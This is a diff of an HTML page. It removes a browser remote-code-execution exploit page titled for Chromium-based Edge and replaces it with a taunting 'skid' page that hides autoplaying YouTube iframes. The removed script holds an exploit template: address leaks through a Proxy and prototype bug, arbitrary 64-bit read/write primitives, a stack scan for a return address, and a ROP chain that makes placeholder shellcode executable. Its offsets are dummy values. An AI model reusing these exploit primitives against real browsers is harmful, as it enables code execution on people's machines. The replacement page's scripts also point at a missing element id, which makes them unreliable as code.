@@ -1,225 +1,110 @@
+
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chromium-Based Edge Remote Code Execution | Taylor Christian Newsome</title>
+    <title>shell.php</title>
     <script>
-    /**
-     * @fileoverview A simplified version of long.js for 64-bit integer operations.
-     * @version 1.0
-     */
-    (function(global) {
-      'use strict';
-
-      // Helper function to create a Long object
-      function Long(low, high, unsigned) {
-        this.low = low | 0;
-        this.high = high | 0;
-        this.unsigned = !!unsigned;
-      }
-
-      // Convert a Long to a string representation
-      Long.prototype.toString = function() {
-        if (this.unsigned) {
-          return (this.high >>> 0).toString(10) + (this.low >>> 0).toString(10);
-        } else {
-          return ((this.high << 32) | (this.low >>> 0)).toString(10);
-        }
-      };
-
-      // Add two Longs
-      Long.prototype.add = function(other) {
-        var low = (this.low >>> 0) + (other.low >>> 0);
-        var high = (this.high >>> 0) + (other.high >>> 0) + (low >>> 32);
-        return new Long(low | 0, high | 0, this.unsigned);
-      };
-
-      // Subtract two Longs
-      Long.prototype.sub = function(other) {
-        var low = (this.low >>> 0) - (other.low >>> 0);
-        var high = (this.high >>> 0) - (other.high >>> 0) - (low >>> 32);
-        return new Long(low | 0, high | 0, this.unsigned);
-      };
-
-      // Logical AND of two Longs
-      Long.prototype.and = function(other) {
-        return new Long(this.low & other.low, this.high & other.high, this.unsigned);
-      };
-
-      // Logical OR of two Longs
-      Long.prototype.or = function(other) {
-        return new Long(this.low | other.low, this.high | other.high, this.unsigned);
-      };
-
-      // Logical XOR of two Longs
-      Long.prototype.xor = function(other) {
-        return new Long(this.low ^ other.low, this.high ^ other.high, this.unsigned);
-      };
-
-      // Comparison of two Longs
-      Long.prototype.equals = function(other) {
-        return this.low === other.low && this.high === other.high;
-      };
-
-      // Static methods for Long
-      Long.fromNumber = function(value, unsigned) {
-        if (unsigned) {
-          return new Long(value >>> 0, Math.floor(value / 0x100000000), true);
-        } else {
-          var low = value | 0;
-          var high = Math.floor(value / 0x100000000) | 0;
-          return new Long(low, high, false);
-        }
-      };
-
-      Long.fromBits = function(low, high, unsigned) {
-        return new Long(low, high, unsigned);
-      };
-
-      // Export Long to global
-      global.dcodeIO = global.dcodeIO || {};
-      global.dcodeIO.Long = Long;
-
-    })(this);
+        // Try to play audio immediately when script is parsed
+        document.addEventListener('DOMContentLoaded', function() {
+            const iframe = document.getElementById('background-music');
+            if (iframe) {
+                iframe.src = "https://www.youtube.com/embed/0jHhHNA2NQs?autoplay=1&mute=0&controls=0";
+            }
+        });
     </script>
+    <style>
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .ascii-art {
+            white-space: pre;
+            font-size: 14px;
+            line-height: 1.2;
+            background-color: #000;
+            padding: 10px;
+            border: 1px solid #ff0000;
+            margin-bottom: 20px;
+        }
+        .header {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #ff0000;
+        }
+        .hidden-player {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Chromium-Based Edge Remote Code Execution</h1>
-    <button id="triggerBugButton">Trigger Bug</button>
+    <!-- YouTube player placed at the very top of the body for earliest possible loading -->
+   <iframe id="music-frame" src="https://www.youtube.com/embed/w_lJDjgWa4Y?autoplay=1&loop=1&playlist=w_lJDjgWa4Y&controls=0&showinfo=0&rel=0&modestbranding=1&iv_load_policy=3&fs=0&cc_load_policy=0&start=0&end=0&origin=https://localhost" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    
+    <div class="container">
+        <div class="header">
+            Why are you even here skid?
+        </div>
+        <div class="ascii-art"><pre>
+██████╗  ██████╗ ███████╗███████╗    ██╗████████╗    ███████╗███████╗███████╗██╗         
+██╔══██╗██╔═══██╗██╔════╝██╔════╝    ██║╚══██╔══╝    ██╔════╝██╔════╝██╔════╝██║         
+██║  ██║██║   ██║█████╗  ███████╗    ██║   ██║       █████╗  █████╗  █████╗  ██║         
+██║  ██║██║   ██║██╔══╝  ╚════██║    ██║   ██║       ██╔══╝  ██╔══╝  ██╔══╝  ██║         
+██████╔╝╚██████╔╝███████╗███████║    ██║   ██║       ██║     ███████╗███████╗███████╗    
+╚═════╝  ╚═════╝ ╚══════╝╚══════╝    ╚═╝   ╚═╝       ╚═╝     ╚══════╝╚══════╝╚══════╝    
+                                                                                         
+██╗     ██╗██╗  ██╗███████╗    ███████╗██╗  ██╗██╗████████╗                              
+██║     ██║██║ ██╔╝██╔════╝    ██╔════╝██║  ██║██║╚══██╔══╝                              
+██║     ██║█████╔╝ █████╗      ███████╗███████║██║   ██║                                 
+██║     ██║██╔═██╗ ██╔══╝      ╚════██║██╔══██║██║   ██║                                 
+███████╗██║██║  ██╗███████╗    ███████║██║  ██║██║   ██║                                 
+╚══════╝╚═╝╚═╝  ╚═╝╚══════╝    ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝                                 
+                                                                                         
+██████╗ ███████╗██╗███╗   ██╗ ██████╗      █████╗     ███████╗██╗  ██╗██╗██████╗ ██████╗ 
+██╔══██╗██╔════╝██║████╗  ██║██╔════╝     ██╔══██╗    ██╔════╝██║ ██╔╝██║██╔══██╗╚════██╗
+██████╔╝█████╗  ██║██╔██╗ ██║██║  ███╗    ███████║    ███████╗█████╔╝ ██║██║  ██║  ▄███╔╝
+██╔══██╗██╔══╝  ██║██║╚██╗██║██║   ██║    ██╔══██║    ╚════██║██╔═██╗ ██║██║  ██║  ▀▀══╝ 
+██████╔╝███████╗██║██║ ╚████║╚██████╔╝    ██║  ██║    ███████║██║  ██╗██║██████╔╝  ██╗   
+╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝╚═════╝   ╚═╝  
+        </pre></div>
+        <div class="footer">
+            &copy; 8===D--. All rights reserved.
+        </div>
+    </div>
+
     <script>
-        var Long = dcodeIO.Long;
-        var dv;
-        var fdv = new DataView(new ArrayBuffer(8));
-        var x = new Array(56).fill(0); // Initialize array with 56 zeros
-
-        function triggerVulnerability() {
-            var [hi, lo] = putDataAndGetAddr(x);
-            [hi, lo] = [hi | 0, (lo + 0x58) | 0];
-            triggerFillFromPrototypesBug(lo, hi);
-            var vtable = read64(new Long(lo - 0x58, hi, true));
-            var v8Base = read64(vtable).sub(0x123456); // Adjust offset for V8 base
-            var threadCtxPtr = read64(v8Base.add(0x789ABC)); // Adjust offset for thread context
-            var stackLimit = read64(threadCtxPtr.add(0xDEF0)); // Adjust offset for stack limit
-            var stack = stackLimit.sub(0xC000).add(10 * 1024 * 1024);
-            var retPtr = v8Base.add(0xFEDCBA); // Adjust offset for return pointer
-            var retPtrAddr;
-
-            for (var i = 8; i < 32 * 1024; i += 8) {
-                var val = read64(stack.sub(i));
-                if (val.equals(retPtr)) {
-                    retPtrAddr = stack.sub(i);
-                    break;
-                }
-            }
-
-            var sc = unescape("%ucccc%ucccc");
-            var [shi, slo] = putDataAndGetAddr(sc);
-            var shcodeAddr = read64(new Long(slo | 0, shi | 0, true).add(0x20));
-            var filler = new Long(0, 0, true);
-            var rop = [
-                v8Base.add(0x1A2B3C), // Adjust ROP chain address for V8
-                shcodeAddr.and(new Long(0xFFFFF000, 0xFFFFFFFF, true)),
-                new Long(0x1000, 0, true),
-                new Long(0x40, 0, true),
-                v8Base.add(0x1A2B1F), // Adjust ROP chain address for V8
-                filler, filler, filler, filler, filler, filler,
-                new Long(0, 0, true),
-                filler, filler, filler, filler, filler, filler,
-                filler, filler, filler, filler, filler, filler,
-                shcodeAddr
-            ];
-
-            for (var i = 0; i < rop.length; ++i) {
-                write64(retPtrAddr.add(i * 8), rop[i]);
-            }
-
-            alert("Exploit triggered!");
-        }
-
-        function triggerFillFromPrototypesBug(lo, hi) {
-            x[2] = lo;
-            x[3] = hi;
-            x[10] = (lo - 0x38) | 0;
-            x[11] = hi;
-            x[8] = 0x200;
-            x[14] = (lo - 0x58) | 0;
-            x[15] = hi;
-            var a = new Array(0x11111111, 0, 0x22222222, 0, 0x33333333, 0, lo, hi, 0x55555555, 0);
-            var handler = {
-                getPrototypeOf: function(target, name) {
-                    return a;
-                }
-            };
-            var p = new Proxy([], handler);
-            var b = [{}, [], "abc"];
-            b.__proto__ = p;
-            b.length = 4;
-            a.shift.call(b);
-            dv = b[2];
-        }
-
-        function putDataAndGetAddr(t) {
-            var d = [1, 2, 3];
-            class Dummy {
-                constructor() {
-                    return d;
-                }
-            }
-            class MyArray extends Array {
-                static get [Symbol.species]() {
-                    return Dummy;
-                }
-            }
-            var a = [{}, t, "theori", 7, 7, 7, 7, 7];
-            function test(i) {
-                return true;
-            }
-
-            a.__proto__ = MyArray.prototype;
-            var o = a.filter(test);
-            var h = [];
-            for (item in o) {
-                var n = new Number(o[item]);
-                if (n < 0) {
-                    n += 0x100000000;
-                }
-                h.push(n);
-            }
-            return [h[3], h[2]];
-        }
-
-        function setAddress(addr) {
-            x[14] = addr.low | 0;
-            x[15] = addr.high | 0;
-        }
-
-        function read32(addr) {
-            setAddress(addr);
-            return new Long(fdv.getUint32(0, true), 0, true);
-        }
-
-        function read64(addr) {
-            setAddress(addr);
-            return new Long(fdv.getUint32(0, true), fdv.getUint32(4, true), true);
-        }
-
-        function write32(addr, val) {
-            setAddress(addr);
-            fdv.setUint32(0, val.low | 0, true);
-        }
-
-        function write64(addr, val) {
-            setAddress(addr);
-            fdv.setUint32(0, val.low | 0, true);
-            fdv.setUint32(4, val.high | 0, true);
-        }
-
-        // Attach event listener to the button
-        document.getElementById('triggerBugButton').addEventListener('click', function() {
-            triggerVulnerability();
-        });
+        // Additional script to ensure the YouTube video plays
+        window.onload = function() {
+            // Reload the iframe to trigger autoplay again
+            const iframe = document.getElementById('background-music');
+            const src = iframe.src;
+            iframe.src = src;
+        };
     </script>
 </body>
 </html>
